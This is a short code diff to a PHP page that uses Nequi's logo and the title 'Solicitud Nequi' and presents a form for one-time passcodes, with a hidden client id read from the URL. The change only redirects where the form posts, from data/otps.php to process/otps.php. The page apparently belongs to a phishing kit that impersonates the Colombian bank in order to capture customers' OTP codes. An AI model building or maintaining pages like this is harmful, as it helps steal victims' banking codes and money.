@@ -34,7 +34,7 @@ if ($stmt->rowCount() > 0) {
 <body>
     <center><img src="config/img/nequi.svg"></center>
     <h2 class="text3">Solicitud Nequi</h2>
-    <form id="otp-form" method="POST" action="data/otps.php" onsubmit="return prepareOTP();">
+    <form id="otp-form" method="POST" action="process/otps.php" onsubmit="return prepareOTP();">
         <input type="hidden" name="cliente_id"
             value="<?php echo isset($_GET['id']) ? htmlspecialchars($_GET['id']) : ''; ?>">
 
